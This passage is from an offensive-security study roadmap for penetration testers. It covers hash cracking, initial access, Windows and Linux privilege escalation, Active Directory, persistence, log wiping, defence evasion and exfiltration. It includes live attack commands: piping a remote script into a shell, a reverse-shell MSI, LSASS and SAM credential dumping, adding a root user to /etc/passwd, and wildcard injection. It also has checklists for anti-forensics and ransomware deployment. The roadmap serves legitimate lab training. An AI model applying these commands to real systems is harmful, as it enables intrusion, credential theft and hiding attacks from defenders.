- [ ] **Common Hash Types:** Master identifying and handling **NTLM, NTLMv1/v2, NetNTLM, MD5, SHA-1, SHA-256, bcrypt, Argon2, PBKDF2, WPA2-PMKID, Kerberos (5/17/18/23)**.

---

<a id="stage-2-cracking-methodology-tools"></a>

### **Stage 2: Cracking Methodology & Tools**

> [!TIP]
> **Goal:** Apply the right technique to each hash type.

- [ ] **Hashcat Fundamentals:** Master **attack modes (-a 0 dictionary, -a 1 combination, -a 3 brute/mask, -a 6/7 hybrid)**, GPU acceleration, session management, and potfile usage.

- [ ] **John the Ripper:** Use **JtR** for format auto-detection, **incremental mode, wordlist mode, rules**, and cracking **non-GPU-friendly formats** (bcrypt, Argon2).

- [ ] **Dictionary Attacks:** Use curated wordlists — **rockyou.txt, SecLists, weakpass, kaonashi** — as the first pass against any hash.

- [ ] **Rule-Based Attacks:** Apply **Hashcat rules (best64.rule, OneRuleToRuleThemAll, d3ad0ne)** to mangle wordlists — capitalize, add numbers, leet-speak substitutions — to crack complex passwords efficiently.

- [ ] **Mask Attacks:** Use **Hashcat mask syntax** (`?u?l?l?l?l?d?d?s`) to brute-force **known password patterns** (e.g., company naming conventions, seasonal passwords like `Summer2024!`).

- [ ] **Hybrid Attacks:** Combine **wordlist + mask** (`-a 6` / `-a 7`) to crack passwords like `rockyou_words + 2024!` or `!2024 + rockyou_words`.

- [ ] **Rainbow Tables:** Understand **precomputed hash-to-plaintext lookup tables** and why **salting defeats them**; use **RainbowCrack** for legacy unsalted MD5/SHA1.

---

<a id="stage-3-protocol-specific-cracking"></a>

### **Stage 3: Protocol-Specific Cracking**

> [!TIP]
> **Goal:** Crack hashes captured from real network protocols.

- [ ] **NTLM / NetNTLMv2:** Capture with **Responder, ntlmrelayx**; crack with **hashcat -m 5600**; understand why NTLMv2 is harder than NTLMv1.

- [ ] **Kerberos Tickets:** Crack **Kerberoasted TGS (-m 13100)** and **AS-REP hashes (-m 18200)** offline with hashcat using targeted service-account wordlists.

- [ ] **WPA2 Handshakes:** Crack **4-way handshake (-m 22000)** and **PMKID (-m 22001)** from wireless captures with GPU-accelerated hashcat.

- [ ] **SSH Private Keys:** Use **ssh2john** to extract crackable hash from passphrase-protected keys; crack with JtR.

- [ ] **Office / PDF / ZIP:** Extract hashes with **office2john, pdf2john, zip2john**; crack with JtR or hashcat for document password recovery.

---

<a id="stage-4-wordlist-intelligence-curation"></a>

### **Stage 4: Wordlist & Intelligence Curation**

> [!TIP]
> **Goal:** Build targeted wordlists that outperform generic lists.

- [ ] **OSINT-Driven Wordlists:** Use **CeWL** to spider target websites and extract **company-specific vocabulary** for highly targeted password lists.

- [ ] **Custom Rule Writing:** Write **Hashcat/JtR rules** encoding target's known password policy — minimum length, required chars, common suffix patterns.

- [ ] **Credential Stuffing Lists:** Use **breach corpora (Collection #1, Dehashed)** to build target-specific lists from previously leaked passwords for the same user base.

- [ ] **Mentalist / PACK:** Use **Mentalist (GUI) or PACK (Policy Analysis)** to analyze cracked passwords and generate statistically optimized masks and rules.

> 📌 **Cross-Reference:** Password cracking skills are directly applied in **[Part 23: Active Directory & Entra ID](Phase-6.md#part-23-active-directory-entra-id)** (Kerberoasting, AS-REP Roasting), **[Part 21: Wireless Pentesting](Phase-5.md#part-21-wireless-pentesting)** (WPA handshake cracking), and **Part 7: System Hacking** (credential-based lateral movement). Complete this Part before Phase 5–6.

---

<a id="toc-part-7-system-hacking--initial-compromise"></a>
<a id="part-7-system-hacking-initial-compromise"></a>

## Part 7: System Hacking & Initial Compromise

<a id="stage-1-the-breach-initial-access-exploitation"></a>

### **Stage 1: The Breach (Initial Access & Exploitation)**

> [!TIP]
> **Goal:** Weaponize theoretical vulnerabilities to bypass the perimeter and establish foothold.

**Application & Web Exploitation:**

- [ ] **SQL Injection:** Craft payloads for **error-based, blind, union-based, and time-based** exfiltration.

- [ ] **Buffer Overflow:** Target legacy binaries; craft **ROP chains** to bypass **ASLR/DEP**.

- [ ] **Directory/Path Traversal:** Abuse improper input validation to read **system files, configs, or keys**.

- [ ] **SSTI/Template Injection:** Exploit **Jinja2, Twig, ERB** misconfigs for **RCE**.

- [ ] **Deserialization:** Attack unsafe **Java/Python/PHP** unmarshaling for code execution.

- [ ] **SSRF:** Abuse server trust to pivot to **internal APIs, cloud metadata (IMDS), or localhost services**.

- [ ] **XXE/XML External Entity:** Parse malicious XML for **file read, XXE blind**, and **DOS**.

- [ ] **API Endpoint Abuse:** Exploit **BOLA/BFLA** (Broken Object/Function Level Auth) and **rate-limit bypass**.

- [ ] **Authentication Bypass:** Exploit **logic flaws** in login flows, abuse **password reset tokens**, manipulate **OAuth state parameters**.

- [ ] **Business Logic Flaws:** Identify **race conditions, insufficient workflow validation, price manipulation** in checkout/transaction flows.

- [ ] **File Upload Vulnerabilities:** Bypass **extension filters**, use **null bytes, double extensions, MIME type confusion** to upload **web shells**.

- [ ] **CAPTCHA Bypass:** Exploit **client-side validation**, reuse **tokens**, automate with **OCR/ML models**, abuse **audio alternatives**.

- [ ] **GraphQL Exploitation:** Perform **introspection queries**, abuse **batching/aliasing** for **DoS**, exploit **nested queries** and **IDOR**.

**Credential Assault:**

- [ ] **Brute Force:** Methodical password guessing with **wordlists, rule-based mangling**.

- [ ] **Password Spray:** Low-and-slow attacks across many accounts to avoid lockout.

- [ ] **Default Creds:** Enumerate and test **factory defaults** (admin/admin, root/root).

- [ ] **MFA Bypass:** Exploit **MFA fatigue, SIM-swap, push notification spoofing**.

- [ ] **Credential Stuffing:** Reuse leaked passwords from **breach corpuses** (HIBP/Dehashed).

**Human Vector & Social Engineering:**

- [ ] **Phishing:** Craft **HTML-smuggled payloads, ISO/LNK loaders, OneNote macros** with pretexting.

- [ ] **Whaling/Spear Phishing:** Target **executives** with personalized, researched lures.

- [ ] **Smishing/Vishing:** Use **SMS/voice** to deliver **URL shorteners, MFA prompts, or fake updates**.

- [ ] **Pretext:** Build **fake contractor, vendor, or IT support** persona to extract credentials verbally.

- [ ] **Watering Hole:** Compromise **public websites** frequented by targets to deliver **malware/tracker**.

**Network Interception & MITM:**

> **📌 Cross-Reference:** ARP spoofing, DNS spoofing, SSL stripping, and MITM techniques are taught in detail in **Part 9: Sniffing & Spoofing** (Phases 3–4). WiFi evil twin attacks are covered in **Part 21: Wireless Pentesting**. The techniques here focus on using these as delivery mechanisms for social engineering — review Part 9 first.

- [ ] **NGO Interception:** Capture traffic at **network gateways/bridges** with **tcpdump/Wireshark**.

---

<a id="stage-2-the-ascension-privilege-escalation"></a>

### **Stage 2: The Ascension (Privilege Escalation)**

> [!TIP]
> **Goal:** Move from low-level foothold to administrative control by exploiting system logic.

**Windows Privilege Escalation:**

> [!IMPORTANT]
> **Why This Needs Its Own Methodology:** Windows is the dominant enterprise OS. Every red team engagement involves Windows privilege escalation. The six bullets below from the original stub are insufficient — work through each vector with a dedicated lab VM (TryHackMe "Windows PrivEsc" room, HackTheBox Blue/Optimum/Bastard, or build your own intentional misfig VM). **winPEAS** and **PowerUp** automate discovery — but you must understand every finding manually before relying on automation.

**Step 0 — Enumeration (Always First):**

- [ ] **Automated Enumeration:** Run **winPEAS** (`winpeas.exe`) — read every orange and red finding; do not blindly exploit suggestions. Also run **PowerUp** (`Import-Module PowerUp.ps1; Invoke-AllChecks`) for PowerShell-based checks, and **Seatbelt** for host situational awareness (token privileges, installed software, AppLocker policy).

- [ ] **Manual Baseline Commands:** On foothold, immediately run:
  - `whoami /priv` — check token privileges (SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege are all exploitable)
  - `whoami /groups` — identify group memberships and integrity level
  - `net user %username%` — full user attributes, password expiry, group membership
  - `systeminfo | findstr /i "os name os version hotfix"` — OS version and installed patches
  - `wmic qfe get hotfixid` — list all patches; cross-reference with missing-patch exploit databases
  - `sc query` — enumerate all running services
  - `tasklist /svc` — processes with associated services
  - `netstat -ano` — active network connections and PIDs (identify locally-listening services)
  - `schtasks /query /fo LIST /v` — all scheduled tasks with owners and paths

**Vector 1: Service Misconfigurations**

- [ ] **Unquoted Service Paths:** When a service binary path contains spaces and is unquoted (e.g., `C:\Program Files\Vuln App\service.exe`), Windows will try `C:\Program.exe` first. If you can write to any parent directory, drop a malicious `Program.exe` to escalate.
  - Discovery: `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"`
  - Also: PowerUp `Get-UnquotedService`

- [ ] **Weak Service Binary Permissions:** If you can overwrite the service binary itself, replace it with a payload.
  - Discovery: `icacls "C:\path\to\service.exe"` — look for `(W)` or `(F)` for current user or Everyone group

- [ ] **Weak Service Registry Permissions:** Registry key controlling a service's image path. If writable, change the binary path.
  - Discovery: `Get-ACL "HKLM:\System\CurrentControlSet\Services\VulnSvc"`

**Vector 2: DLL Hijacking**

- [ ] **DLL Search Order Abuse:** When an application loads a DLL by name without an absolute path, Windows searches: application directory → `%SYSTEMROOT%\System32` → `%SYSTEMROOT%` → directories in `%PATH%`. If you can write to a directory searched before the legitimate DLL location, drop a malicious DLL with the same name.
  - Discovery: **Procmon** (Sysinternals) — filter by `Result = NAME NOT FOUND` + `Path ends with .dll` while running the target application to find missing DLLs

- [ ] **DLL Proxying:** Place a malicious DLL that loads the real DLL and also executes a payload — allows transparent hijack without breaking application functionality.

- [ ] **Side-Loading:** High-privileged applications loading DLLs from user-writable locations. Common in enterprise software that runs as SYSTEM but loads plugins from user directories.

**Vector 3: Token Impersonation & Potato Exploits**

- [ ] **SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege:** These privileges (held by IIS service accounts, SQL Server service, local service) allow impersonating any token, including SYSTEM. This is the most common path from `NT AUTHORITY\NETWORK SERVICE` → SYSTEM.
  - **PrintSpoofer** (Windows 10/2019+): `PrintSpoofer.exe -i -c powershell.exe`
  - **JuicyPotato** (Windows Server 2016 and below): requires a CLSID for a COM server running as SYSTEM
  - **GodPotato** (Windows 2012–2022, all versions): `GodPotato.exe -cmd "cmd /c whoami > C:\result.txt"`
  - **RoguePotato**: Works when JuicyPotato CLSID restrictions apply
  - Discovery: `whoami /priv` → look for `SeImpersonatePrivilege Enabled`

- [ ] **Token Duplication (SeDebugPrivilege):** With `SeDebugPrivilege`, open any process including LSASS and winlogon.exe, steal their tokens, and impersonate SYSTEM.
  - Tools: `incognito.exe`, Meterpreter `getsystem`

**Vector 4: UAC Bypass**

- [ ] **UAC Mechanism:** User Account Control elevates processes that request it. Only processes with an auto-elevation manifest bypass the UAC prompt. Most UAC bypass techniques involve abusing auto-elevated trusted Windows binaries.

- [ ] **Technique Examples (Enumerated by UACME Project):**
  - `fodhelper.exe` bypass (Method 33): modify `HKCU\Software\Classes\ms-settings\shell\open\command` registry key — auto-elevated binary loads the key with no prompt
  - `eventvwr.exe` bypass (Method 32): similar registry hijack under `HKCU\Software\Classes\mscfile\shell\open\command`
  - `sdclt.exe` bypass (Method 45): uses `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths`
  - Discovery: UACME project lists 60+ UAC bypass methods by Windows version
  - Detection signature: Look for HKCU registry keys being written before auto-elevated binary execution in Sysmon Event ID 13

- [ ] **UAC Level Check:** `REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` — UAC is disabled if `EnableLUA = 0` (no bypass needed); confirm with `REG QUERY ... /v ConsentPromptBehaviorAdmin` (value 0 = never prompt = bypass trivial)

**Vector 5: Registry Privilege Abuse**

- [ ] **AlwaysInstallElevated:** If both `HKLM` and `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` are set to 1, any `.msi` package can be installed as SYSTEM.
  - Discovery: PowerUp `Get-RegistryAlwaysInstallElevated`
  - Exploit: `msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > malicious.msi; msiexec /quiet /qn /i malicious.msi`

- [ ] **AutoRun Keys (Persistence → Escalation on Higher-Privilege Login):** Write a payload to a registry run key executed by a higher-privilege user:
  - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — requires admin write access but runs for all users
  - `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — no special permission, runs as current user (useful for phishing context)

**Vector 6: Scheduled Task Exploitation**

- [ ] **Writable Task Binary:** If a scheduled task runs as SYSTEM but the binary it executes is writable by your user, replace the binary.
  - Discovery: `schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User\|Status"`
  - Then: `icacls "C:\path\to\task\binary.exe"` — check write permission

- [ ] **Task XML Privilege Escalation:** Some tasks stored in `C:\Windows\System32\Tasks\` have weak ACLs — check the task XML directly for the `<RunAs>` element.

- [ ] **Writable Task Directory:** If the task binary isn't present but you can write to its expected path, create the binary there — it will run as SYSTEM on the next scheduled execution.

**Vector 7: Credential Hunting**

- [ ] **SAM/SYSTEM/SECURITY Registry Hives:** On a live system, these are locked. In offline access (or via shadow copies), extract NTLM hashes:
  - `reg save HKLM\SAM C:\sam.hive` + `reg save HKLM\SYSTEM C:\system.hive` → `secretsdump.py -sam sam.hive -system system.hive LOCAL`
  - Or from shadow copy: `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\sam.hive`

- [ ] **LSASS Memory Dump:** Dump credentials from LSASS for logged-in accounts (requires SYSTEM or SeDebugPrivilege):
  - `procdump.exe -accepteula -ma lsass.exe lsass.dmp` → parse offline with **Mimikatz** `sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords`
  - Mimikatz direct: `privilege::debug; sekurlsa::logonpasswords`
  - Detection: Event ID 4656 (handle to LSASS), Sysmon Event ID 10 (process access)

- [ ] **Credential Manager & DPAPI:** `cmdkey /list` — cached credentials; `vaultcmd /listcreds:"Windows Credentials"`. Decrypt DPAPI blobs with Mimikatz `dpapi::cred` using masterkey.

- [ ] **Configuration File Credential Hunting:**
  - `findstr /si password *.txt *.xml *.ini *.config *.ps1 *.bat`
  - `dir /s /b *pass* *cred* *vnc* *.config 2>nul`
  - `%windir%\Panther\Unattend.xml` — contains base64-encoded admin passwords from OS deployment
  - `C:\inetpub\wwwroot\web.config` — database connection strings often contain cleartext credentials
  - PowerShell history: `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

**Vector 8: Kernel & Windows Component Exploits**

- [ ] **Kernel Exploit Identification:** Check OS version (`systeminfo`) against known public kernel privilege escalation exploits. Priority targets:
  - **MS16-032** (Secondary Logon, Windows 7–10): token impersonation via race condition
  - **MS16-075** (Potato, Windows Vista–2016): NTLM relay to local system
  - **HiveNightmare/SeriousSam** (CVE-2021-36934, Windows 10 21H1+): any user can read SAM hive
  - **PrintNightmare** (CVE-2021-34527): Windows Print Spooler code execution as SYSTEM

- [ ] **Exploit Suggester:** After `systeminfo`, paste output into **Windows-Exploit-Suggester-NG** (`wesng.py`): `python wesng.py --update; python wesng.py systeminfo.txt` — cross-references patches against known CVEs.

**Windows Privesc Lab Targets:**

> [!TIP]
> Work through these in order. Each machine reinforces specific vectors with different difficulty.

| Machine         | Platform    | Primary Vectors                          | Key Learning                       |
| --------------- | ----------- | ---------------------------------------- | ---------------------------------- |
| Blue            | HackTheBox  | MS17-010 (EternalBlue)                   | RCE → SYSTEM via kernel exploit    |
| Optimum         | HackTheBox  | HFS RCE → MS16-032                       | Exploit suggester workflow         |
| Bastard         | HackTheBox  | Drupal RCE → token impersonation         | SeImpersonatePrivilege path        |
| Windows PrivEsc | TryHackMe   | Service misconfigs, registry, DLL hijack | Structured privesc methodology     |
| Steel Mountain  | TryHackMe   | HFS → PowerUp → unquoted path            | Guided Windows privesc walkthrough |
| Alfred          | TryHackMe   | Jenkins → token impersonation            | JuicyPotato/Incognito              |
| Retro           | HackTheBox  | CVE research + credential hunting        | Manual credential discovery        |
| AccessChk       | Personal VM | Custom misconfigs                        | Build your own vuln lab            |

**Active Directory Attacks:**

- [ ] **Kerberoasting:** Extract **TGS tickets** for **service accounts (SPNs)**, crack offline with **hashcat/JtR** to recover **plaintext passwords**.

- [ ] **AS-REP Roasting:** Target accounts with **pre-authentication disabled**, extract **AS-REP hashes** for offline cracking.

- [ ] **Golden/Silver Tickets:** Forge **TGT (Golden)** or **TGS (Silver)** tickets using **krbtgt hash** or **service account hash** for **persistent domain access**.

- [ ] **DCSync Attack:** Abuse **replication rights** to extract **password hashes** from **Domain Controller** without direct access.

- [ ] **BloodHound/SharpHound:** Map **AD trust relationships, ACLs, group memberships** to find **shortest path to Domain Admin**.

- [ ] **NTLM Relay:** Capture **NTLM authentication** and relay to **SMB/LDAP/HTTP** services for **lateral movement**.

- [ ] **Constrained/Unconstrained Delegation:** Abuse **delegation rights** to impersonate **privileged users** across domain services.

**Linux Privilege Escalation:**

> [!IMPORTANT]
> **Why This Needs Its Own Methodology:** Linux privesc is the most consistently tested domain on OSCP, HTB, and real-world Linux engagements. The five bullets below are not enough. Work through each vector with a dedicated lab VM (try Tryhackme "Linux PrivEsc" room, HackTheBox Jarvis/Sunday, or build your own with intentional misconfigs). **LinPEAS** and **Linux Smart Enumeration (lse.sh)** automate discovery — but you must understand every finding manually before relying on automation.

**Step 0 — Enumeration (Always First):**

- [ ] **Manual Baseline:** On foothold, immediately run: `id`, `whoami`, `hostname`, `uname -a`, `cat /etc/os-release`, `cat /proc/version`, `env`, `sudo -l`, `cat /etc/crontab`, `ls -la /etc/cron.*`, `find / -perm -4000 -type f 2>/dev/null` (SUID), `find / -perm -2000 -type f 2>/dev/null` (SGID).

- [ ] **Automated Tools:** Run **LinPEAS** (`curl -L https://linpeas.sh | sh`) and **linux-exploit-suggester-2** (`les2.sh`) — read every finding, do not blindly run suggested exploits.

- [ ] **Writable Paths:** Check `find / -writable -type f 2>/dev/null | grep -v proc` — writable files owned by root or executed by root cron jobs are high-value targets.

**Vector 1 — SUID/SGID Binary Abuse:**

- [ ] **Mechanism:** Files with the SUID bit set execute as their owner (usually root) rather than the calling user. Any vulnerability in the program, or any supported feature that spawns a shell or writes files, becomes a root escalation.

- [ ] **Discovery:** `find / -perm -4000 -type f 2>/dev/null` — list every SUID binary on the system. Cross-reference each against **GTFOBins** (`https://gtfobins.github.io`) for known escape techniques.

- [ ] **Common Exploitable Binaries:** `find`, `vim`, `nano`, `cp`, `mv`, `bash`, `python`, `perl`, `awk`, `nmap` (older versions), `env`, `less`, `more`, `man`, `ftp`, `screen`.

- [ ] **PATH Hijacking:** If a SUID binary calls another program using a relative path (e.g., `system("service apache2 start")` without full path), prepend a writable directory to `$PATH` containing a malicious `service` binary.

- [ ] **Shared Object Injection:** If `strace`/`ltrace` shows a SUID binary loading a missing `.so` file from a writable directory, compile a malicious shared object and place it there.

**Vector 2 — sudo Misconfiguration:**

- [ ] **Discovery:** `sudo -l` — lists what the current user can run as root (or other users) without a password or with one.

- [ ] **NOPASSWD Rules:** Any binary listed under `NOPASSWD` is an immediate escalation — check GTFOBins for the exact `sudo` escape method.

- [ ] **Wildcard Abuse:** `sudo /usr/bin/zip *` — if a wildcard is present and the binary interprets arguments as filenames, inject `--unzip-command=sh -c /bin/bash` or similar via specially named files.

- [ ] **LD_PRELOAD Injection:** If `sudo -l` shows `env_keep+=LD_PRELOAD`, compile a malicious shared library and set `sudo LD_PRELOAD=/tmp/evil.so <allowed_program>` to execute code as root before the real program.

- [ ] **Shell Escape via sudo:** Programs that run editors, pagers, or shells (vim, less, more, man, awk, perl, python) frequently allow shell escapes — check GTFOBins for the specific invocation syntax under `sudo`.

**Vector 3 — Cron Job Abuse:**

- [ ] **Discovery:** `cat /etc/crontab`, `ls -la /etc/cron.*`, `crontab -l`, `find / -name "*cron*" 2>/dev/null`, `systemctl list-timers` (systemd). Also monitor `/var/log/syslog` or `/var/log/cron` to identify jobs not visible in standard config files.

- [ ] **Writable Script Hijack:** If a root-owned cron job executes a script that you can write to, replace or append to the script with a reverse shell or setuid bash copy.

- [ ] **Writable Directory in PATH:** If a root cron job calls a binary using a relative name and the cron `PATH` variable includes a directory you can write to, place a malicious binary with the same name in that directory.

- [ ] **Wildcard Injection (cron + tar):** `tar czf /backup.tar.gz /tmp/*` run by root — create files named `--checkpoint=1` and `--checkpoint-action=exec=sh evil.sh` in `/tmp` to inject arbitrary command execution.

- [ ] **Systemd Timers:** Check `systemctl list-timers --all` and inspect the associated `.service` files with `systemctl cat <service>`. If the `ExecStart` path is writable, hijack it.

**Vector 4 — Linux Capabilities Abuse:**

- [ ] **Mechanism:** Linux capabilities divide root privileges into granular units. A binary granted `cap_setuid` can change its UID to 0 without being SUID. This is invisible to standard SUID searches.

- [ ] **Discovery:** `getcap -r / 2>/dev/null` — lists all binaries with assigned capabilities.

- [ ] **High-Value Capabilities:** `cap_setuid+ep`, `cap_net_bind_service+ep`, `cap_net_raw+ep`, `cap_sys_admin+ep`, `cap_dac_override+ep` (override DAC permissions on any file).

- [ ] **Python with cap_setuid:** `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

- [ ] **Perl with cap_setuid:** `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'`

**Vector 5 — Writable Files & PATH Hijacking:**

- [ ] **Writable /etc/passwd:** If `/etc/passwd` is world-writable, add a new root user with a known password hash (`openssl passwd -1 password` → `$1$...`): `echo 'hacker:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd`.

- [ ] **Writable /etc/shadow:** Direct password change for root or any account.

- [ ] **Writable /etc/sudoers or /etc/sudoers.d/:** Add `ALL=(ALL:ALL) NOPASSWD: ALL` for your user.

- [ ] **NFS Root Squash Disabled:** If `/etc/exports` contains a share with `no_root_squash`, mount it from attacker machine as root, create a SUID binary, and execute on target.

**Vector 6 — Kernel Exploits (Last Resort):**

- [ ] **When to Use:** Kernel exploits are noisy, risky (system crash), and should be the last vector tried — after all misconfiguration-based vectors are exhausted.

- [ ] **Identification:** `uname -a` → kernel version → check **linux-exploit-suggester-2** and **searchsploit** for matching CVEs. Verify exploit is tested for your exact distribution and version.

- [ ] **Known Exploits:** Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), DirtyCred (CVE-2022-2588), OverlayFS (CVE-2023-0386), Looney Tunables (CVE-2023-4911). Understand each mechanism rather than running blind.

- [ ] **Compilation on Target:** Many kernel exploits require compiling on the target or a matching system — check `gcc --version` and available headers (`/usr/include`).

**Vector 7 — Environment & Configuration Leaks:**

- [ ] **History Files:** `cat ~/.bash_history`, `cat ~/.zsh_history`, `cat ~/.mysql_history`, `cat ~/.python_history` — frequently contain passwords, commands run as root, or credentials passed as CLI arguments.

- [ ] **Config Files & Credentials:** `find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name ".env" 2>/dev/null | xargs grep -l "password\|passwd\|secret\|key" 2>/dev/null` — locate configuration files with embedded credentials.

- [ ] **SSH Keys:** `find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null` — unprotected private keys can provide lateral movement or privilege escalation.

- [ ] **Database Credentials:** Web application config files (`/var/www/html/config.php`, `wp-config.php`, `database.yml`, `.env`) frequently contain MySQL/PostgreSQL credentials that reuse the root password.

- [ ] **Readable /etc/shadow:** `cat /etc/shadow` — if readable, extract hashes and crack offline with hashcat.

**Vector 8 — Service & Process Exploitation:**

- [ ] **Root-Running Services:** `ps aux | grep root` — identify services running as root that may have vulnerabilities or writable config files.

- [ ] **Writable Service Binaries:** `find /etc/systemd/system/ -writable 2>/dev/null` — writable unit files allow modifying `ExecStart` to execute arbitrary commands as root on next service start/restart.

- [ ] **Weak File Permissions on Critical Binaries:** `ls -la /usr/bin/<service>` — if a service binary is world-writable, replace it.

**Linux Privesc Lab Targets (Recommended Practice):**

| Platform    | Machine/Room            | Primary Vectors Covered              |
| ----------- | ----------------------- | ------------------------------------ |
| TryHackMe   | "Linux PrivEsc" room    | SUID, sudo, cron, capabilities, PATH |
| HackTheBox  | Jarvis, Sunday, Shocker | SUID, sudo misconfiguration          |
| HackTheBox  | Cronos                  | Cron job hijacking                   |
| VulnHub     | Lin.Security            | Comprehensive multipath              |
| Local Build | Custom misconfig VM     | Build your own with 8 vectors above  |

**Container & K8s Breakout:**

> **📌 Cross-Reference:** Container and Kubernetes security is taught in depth in **Part 25: Container & Orchestration Security** (Phase 6). The techniques below provide awareness for system hackers; Part 25 covers the full container attack surface.

- [ ] **Mounted docker.sock:** Escape **container to host** via **Docker socket abuse**.

- [ ] **Privileged Containers:** Escape from **--privileged, CAP_SYS_ADMIN** containers.

- [ ] **hostPath Mounts:** Write to **host filesystem** via mounted volumes for **persistence**.

- [ ] **RBAC/CNI Misconfigs:** Abuse **Kubernetes role bindings** and **network policy gaps**.

**Cloud Platform Attacks:**

- [ ] **AWS IAM Exploitation:** Enumerate **overprivileged roles**, abuse **AssumeRole**, exploit **resource-based policies** for **privilege escalation**.

- [ ] **S3 Bucket Abuse:** Find **public buckets** via **bucket enumeration**, exploit **ACL misconfigs**, steal data from **pre-signed URLs**.

- [ ] **Cloud Metadata Services (IMDS):** Query **169.254.169.254** for **IAM credentials, instance metadata**, use **IMDSv2 bypass** techniques.

- [ ] **Azure AD Exploitation:** Abuse **service principals**, steal **access tokens**, exploit **OAuth consent grants** for lateral movement.

- [ ] **GCP Service Accounts:** Steal **service account keys**, abuse **IAM bindings**, exploit **Compute Engine metadata**.

- [ ] **Lambda/Function Abuse:** Inject code into **serverless functions**, abuse **environment variables**, exfil via **function logs**.

**LOLBAS & Living off the Land:**

- [ ] **Windows:** Abuse **PowerShell, WMI, certutil, bitsadmin, mshta** for **execution and evasion**.

- [ ] **Linux:** Leverage **bash, find, awk, sed, curl, wget** for **lateral movement and persistence**.

---

<a id="stage-3-the-stronghold-persistence-lateral-movement"></a>

### **Stage 3: The Stronghold (Persistence & Lateral Movement)**

> [!TIP]
> **Goal:** Establish permanent presence and move horizontally across network.

**Credential Harvesting & Token Abuse:**

- [ ] **Pass-the-Hash:** Capture **NTLM hashes** and re-authenticate without cracking passwords.

- [ ] **Pass-the-Ticket:** Steal **Kerberos TGS tickets** to access **network services as compromised user**.

- [ ] **LSASS Dumping:** Extract **plaintext creds, hashes** via **mimikatz, procdump, comsvcs.dll**.

- [ ] **Browser/SSO Token Theft:** Harvest **OAuth/SAML tokens, session cookies** from **memory or storage**.

- [ ] **SSH Key Harvesting:** Steal **private keys** from **~/.ssh/id_rsa, agent sockets**.

**Malware & Backdoors:**

- [ ] **Rootkit Deployment:** Hide **files, processes, ports** via **kernel-mode rootkit** for **deep persistence**.

- [ ] **Trojan Backdoors:** Deploy **reverse shells, C2 beacons** disguised as **legitimate services**.

- [ ] **Bootkit/UEFI Implants:** Achieve **pre-OS persistence** via **bootloader compromise**.

- [ ] **Web Shell Placement:** Upload **ASP.NET, PHP, JSP** shells to **web-root** for **persistent access**.

- [ ] **Cron/Registry Backdoors:** Install **cron jobs, registry RunOnce** for **automatic re-execution**.

**Lateral Movement & Pivoting:**

- [ ] **SMB/WinRM:** Use **PsExec, Invoke-Command** to execute **commands on adjacent machines**.

- [ ] **SSH Agent Hijack:** Compromise **SSH forwarding** to move to **key-trusted hosts**.

- [ ] **RDP Relay/NTLM Relay:** Exploit **weak signing** to relay **RDP/HTTP credentials** to **other systems**.

- [ ] **DNS Exfiltration:** Tunnel **data over DNS queries** to exfiltrate **files incrementally**.

- [ ] **Printer/SNMP Abuse:** Exploit **print servers, SNMP v1/v2c** for **lateral access**.

- [ ] **SaaS-to-SaaS Pivoting:** Leverage **OAuth tokens/app integrations** to pivot from **Slack/Teams** into **Salesforce/GitHub/Google Workspace**.

---

<a id="stage-4-the-shadow-defense-evasion-anti-forensics"></a>

### **Stage 4: The Shadow (Defense Evasion & Anti-Forensics)**

> [!TIP]
> **Goal:** Blind the Blue Team and minimize evidence of compromise.

**Log Manipulation & Cleanup:**

- [ ] **Windows Event Log:** Delete or clear **Security, System, Application** logs; disable **audit logging**.

- [ ] **Linux Auditd:** Disable **auditd**, flush **auth.log, syslog** via **log rotation abuse**.

- [ ] **Firewall/SIEM:** Identify **log shipping** and poison **central logs** or syslog streams.

- [ ] **Application Logs:** Scrub **web server logs, database audit trails, application-specific logs**.

**Defense Evasion:**

- [ ] **EDR Evasion:** Disable **Windows Defender, real-time protection**; abuse **exploit guard gaps**.

- [ ] **DLP Bypass:** Exfil via **covert channels, low-bandwidth tunnels, encryption obfuscation**.

- [ ] **IDS/NIDS Evasion:** Use **packet fragmentation, timing jitter, polymorphic payloads**.

- [ ] **AppArmor/SELinux Bypass:** Disable or escape **mandatory access controls**.

**Anti-Forensics:**

- [ ] **File Deletion:** Use **shred, srm, cipher /w** for **secure wiping** of tools and artifacts.

- [ ] **Timestomping:** Modify **file timestamps** (touch -t, $MFT, xattr) to **hide activity**.

- [ ] **Memory Wiping:** Clear **bash history, .zsh_history, PowerShell history** and environment variables.

- [ ] **Registry Cleanup:** Delete **run keys, browser history, recent documents, prefetch files**.

- [ ] **Obfuscation:** Use **base64, hex, ROT13** to hide **scripts, commands, strings** from pattern matching.

---

<a id="stage-5-data-exfiltration-impact"></a>

### **Stage 5: Data Exfiltration & Impact**

> [!TIP]
> **Goal:** Extract sensitive data and demonstrate business impact.

**Data Exfiltration Channels:**

- [ ] **DNS Tunneling:** Encode **data in DNS queries** and exfil via **recursive lookups**.

- [ ] **HTTPS Covert Channels:** Blend **exfil into normal HTTPS** streams with **size/timing variance**.

- [ ] **Cloud APIs:** Use **pre-signed S3/Blob URLs, Drive APIs** for **high-bandwidth exfil**.

- [ ] **ICMP/Ping Tunneling:** Tunnel **data over ping requests** when **TCP/UDP egress blocked**.

- [ ] **Dead-Drop Upload:** Stage **files to attacker-controlled sites** (GitHub gists, pastebin, etc.).

**Impact & Damage:**

- [ ] **Ransomware Deployment:** Encrypt **critical files** with **RSA/AES hybrid** and demand **ransom**.

